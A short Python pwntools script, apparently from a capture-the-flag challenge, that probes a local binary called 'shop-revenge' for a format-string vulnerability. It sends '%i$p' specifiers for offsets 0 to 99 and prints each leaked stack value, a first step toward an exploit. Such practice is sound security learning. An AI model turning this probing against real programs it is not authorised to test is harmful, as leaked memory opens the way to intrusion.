from pwn import *

exe = ('./shop-revenge')
binary = context.binary = ELF(exe)

for i in range(100):
	p = process(exe)
	p.sendlineafter(b'exit',f'%{i}$p'.encode())
	p.recvline()
	p.recvline()
	a = p.recvline()
	print(i," = ", a)
	p.close()
